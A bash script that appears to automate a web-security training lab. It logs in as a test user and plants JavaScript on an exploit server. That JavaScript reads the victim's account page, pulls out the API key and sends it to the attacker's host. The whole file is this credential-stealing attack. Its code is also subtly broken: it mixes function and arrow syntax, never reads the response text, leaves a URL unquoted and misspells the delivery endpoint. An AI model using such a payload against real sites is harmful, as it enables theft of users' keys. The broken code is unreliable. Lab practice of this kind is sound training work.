#!/bin/bash

source ../common.hook

USERNAME='wiener'
PASSWORD='peter'

login $USERNAME $PASSWORD

read -r -d '' JS << EOF
<script>
    window.addEventListener('DOMContentLoaded', (event) => {
        fetch($PS_URL/my-account)
            .then(function (data) => {
                var regex = new RegExp('<span id="apikey">(.*)<\/span>')
                fetch('${PS_EX_URL}/exploit/' + regex.exec(data)[1])
            })
    })
</script>
EOF

curl $PS_EX_URL -H "Cookie: session=$COOKIE" -d "urlIsHttps=on&responseFile=%2Fexploit&responseHead=HTTP%2F1.1+200+OK%0D%0AContent-Type%3A+text%2Fhtml%3B+charset%3Dutf-8&responseBody=$JS&formAction=STORE"

curl "${PS_EX_URL}/deliver-to-vicitm" -H "Cookie: session=$COOKIE"
